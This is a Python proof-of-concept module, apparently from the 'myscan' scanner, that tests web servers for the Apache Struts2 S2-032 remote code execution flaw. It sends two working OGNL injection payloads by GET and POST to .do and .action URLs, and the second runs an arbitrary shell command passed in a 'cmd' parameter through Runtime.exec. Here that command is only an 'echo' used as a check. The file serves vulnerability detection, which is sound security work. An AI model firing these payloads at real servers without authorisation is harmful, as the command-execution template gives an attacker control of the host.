#!/usr/bin/env python3
# @Time    : 2020-04-09
# @Author  : caicai
# @File    : poc_struts2_032.py
'''
简直完美！
'''
import copy,random,re
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_num,get_random_str
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.config import scan_set

class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Struts2-032"
        self.vulmsg = "Struts2-032远程代码执行"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        # 添加限定条件
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        if self.dictdata.get("url").get("extension").lower() not in ["do","action"]:
            return
        ran_a = random.randint(10000000, 20000000)
        ran_b = random.randint(1000000, 2000000)
        ran_check = ran_a - ran_b
        random_str=get_random_str(6)
        checks = [str(ran_check),random_str]
        payloads = [
            r"method%3a%23_memberAccess%3d@ognl.OgnlContext+@DEFAULT_MEMBER_ACCESS%2c%23kxlzx%3d+@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28" + str(
                    ran_a) + '-' + str(ran_b) + "%29%2c%23kxlzx.close",
            r"method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=echo%20"+random_str+r"&pp=\\A&ppp=%20&encoding=UTF-8",
        ]

        for payload in payloads:
            for method in ["GET","POST"]:
                headers = {
                    "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
                    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
                req={
                    "url":self.url+"?"+payload if method=="GET" else self.url,
                    "method":method,
                    "headers":headers,
                    "data":payload if method=="POST" else "",
                    "verify":False,
                    "timeout":10,
                }
                r=request(**req)
                if r!=None :
                    for check in checks:
                        if check==random_str :
                            if re.search(("[^(echo)][^ (%20)]{}|^\s*{}\s*$".format(random_str,random_str)).encode(),r.content):
                                self.save(r)
                                return
                        else:
                            if check.encode() in r.content:
                                self.save(r)
                                return
    def save(self,r):
        parser_=response_parser(r)
        self.result.append({
            "name": self.name,
            "url": self.url,
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "request":parser_.getrequestraw(),
                "response":parser_.getresponseraw(),
            }
        })
